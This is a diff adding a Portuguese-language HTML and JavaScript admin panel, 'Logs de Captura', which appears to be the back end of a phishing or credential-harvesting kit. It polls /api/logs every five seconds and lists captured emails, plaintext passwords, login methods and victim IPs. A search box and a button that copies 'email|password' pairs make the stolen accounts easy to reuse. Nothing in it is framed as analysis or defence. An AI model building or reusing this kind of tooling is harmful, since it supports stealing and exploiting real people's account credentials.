@@ -1,0 +1,174 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Admin Panel - Capturas</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --bg: #0f1115;
+            --panel-bg: #1a1d24;
+            --border: #2c313c;
+            --text: #e2e8f0;
+            --text-muted: #8b949e;
+            --accent: #f75c0b;
+            --accent-hover: #e04b00;
+            --success: #2ea043;
+        }
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        body {
+            font-family: 'Inter', sans-serif; background: var(--bg); color: var(--text);
+            min-height: 100vh; padding: 40px 20px;
+        }
+        .container { max-width: 1200px; margin: 0 auto; }
+        header {
+            display: flex; justify-content: space-between; align-items: center;
+            margin-bottom: 30px; padding-bottom: 20px; border-bottom: 1px solid var(--border);
+        }
+        h1 { font-size: 24px; font-weight: 600; display: flex; align-items: center; gap: 10px; }
+        h1 span { color: var(--accent); }
+        .stats { display: flex; gap: 20px; font-size: 14px; color: var(--text-muted); }
+        .stats strong { color: var(--text); font-size: 18px; display: block; }
+        
+        .controls { display: flex; gap: 16px; margin-bottom: 20px; }
+        input[type="text"] {
+            flex: 1; background: var(--panel-bg); border: 1px solid var(--border);
+            padding: 12px 16px; border-radius: 8px; color: var(--text); font-size: 14px;
+            outline: none; transition: border 0.2s;
+        }
+        input[type="text"]:focus { border-color: var(--accent); }
+        button.refresh {
+            background: var(--accent); color: #fff; border: none; padding: 12px 24px;
+            border-radius: 8px; font-weight: 600; cursor: pointer; transition: background 0.2s;
+            display: flex; align-items: center; gap: 8px;
+        }
+        button.refresh:hover { background: var(--accent-hover); }
+        
+        table {
+            width: 100%; border-collapse: collapse; background: var(--panel-bg);
+            border-radius: 12px; overflow: hidden; border: 1px solid var(--border);
+            box-shadow: 0 4px 6px rgba(0,0,0,0.3);
+        }
+        th {
+            text-align: left; padding: 16px; font-size: 12px; text-transform: uppercase;
+            color: var(--text-muted); font-weight: 600; letter-spacing: 0.5px;
+            border-bottom: 1px solid var(--border); background: #15181d;
+        }
+        td {
+            padding: 16px; border-bottom: 1px solid var(--border); font-size: 14px;
+            font-family: 'JetBrains Mono', monospace; vertical-align: middle;
+        }
+        tr:last-child td { border-bottom: none; }
+        tr:hover { background: rgba(255,255,255,0.02); }
+        
+        .method-badge {
+            display: inline-block; padding: 4px 10px; border-radius: 6px;
+            font-size: 12px; font-weight: 600; font-family: 'Inter', sans-serif;
+            background: rgba(247, 92, 11, 0.15); color: #ff8a50; border: 1px solid rgba(247, 92, 11, 0.3);
+        }
+        .copy-btn {
+            background: transparent; border: 1px solid var(--border); color: var(--text-muted);
+            padding: 6px 10px; border-radius: 6px; cursor: pointer; font-size: 12px;
+            transition: all 0.2s;
+        }
+        .copy-btn:hover { border-color: var(--accent); color: var(--accent); }
+        .empty { text-align: center; padding: 60px; color: var(--text-muted); }
+    </style>
+</head>
+<body>
+<div class="container">
+    <header>
+        <h1><span>■</span> Logs de Captura</h1>
+        <div class="stats">
+            <div>Total<strong id="total-count">0</strong></div>
+            <div>Status<strong style="color: var(--success); font-size: 14px;">● Online</strong></div>
+        </div>
+    </header>
+    
+    <div class="controls">
+        <input type="text" id="search" placeholder="Buscar por e-mail, método ou IP...">
+        <button class="refresh" onclick="fetchLogs()">↻ Atualizar</button>
+    </div>
+
+    <table>
+        <thead>
+            <tr>
+                <th style="width: 50px;">#</th>
+                <th>Data / Hora</th>
+                <th>Método</th>
+                <th>E-mail</th>
+                <th>Senha</th>
+                <th>IP</th>
+                <th style="width: 80px;">Ação</th>
+            </tr>
+        </thead>
+        <tbody id="logs-body">
+            <tr><td colspan="7" class="empty">Carregando dados...</td></tr>
+        </tbody>
+    </table>
+</div>
+
+<script>
+    let allLogs = [];
+
+    async function fetchLogs() {
+        try {
+            const res = await fetch('/api/logs');
+            if (res.status === 401) {
+                alert('Sessão expirada. Recarregue a página.');
+                return;
+            }
+            allLogs = await res.json();
+            renderLogs(allLogs);
+            document.getElementById('total-count').innerText = allLogs.length;
+        } catch (err) {
+            console.error(err);
+        }
+    }
+
+    function renderLogs(logs) {
+        const tbody = document.getElementById('logs-body');
+        if (logs.length === 0) {
+            tbody.innerHTML = '<tr><td colspan="7" class="empty">Nenhum registro encontrado.</td></tr>';
+            return;
+        }
+
+        tbody.innerHTML = logs.map(l => `
+            <tr>
+                <td>#${l.id}</td>
+                <td style="color: var(--text-muted); font-size: 12px;">${new Date(l.timestamp).toLocaleString('pt-BR')}</td>
+                <td><span class="method-badge">${l.method || 'N/A'}</span></td>
+                <td style="color: #79c0ff;">${l.email || '-'}</td>
+                <td style="color: #ff7b72;">${l.password || '-'}</td>
+                <td style="color: var(--text-muted); font-size: 12px;">${l.ip ? l.ip.replace('::ffff:', '') : 'N/A'}</td>
+                <td>
+                    <button class="copy-btn" onclick="copyText('${l.email}|${l.password}')">Copiar</button>
+                </td>
+            </tr>
+        `).join('');
+    }
+
+    function copyText(text) {
+        navigator.clipboard.writeText(text).then(() => {
+            alert('E-mail e Senha copiados!');
+        });
+    }
+
+    // Filtro de busca
+    document.getElementById('search').addEventListener('input', (e) => {
+        const q = e.target.value.toLowerCase();
+        const filtered = allLogs.filter(l => 
+            (l.email && l.email.toLowerCase().includes(q)) || 
+            (l.method && l.method.toLowerCase().includes(q)) ||
+            (l.ip && l.ip.includes(q))
+        );
+        renderLogs(filtered);
+    });
+
+    // Inicialização e Auto-refresh (5s)
+    fetchLogs();
+    setInterval(fetchLogs, 5000);
+</script>
+</body>
+</html>
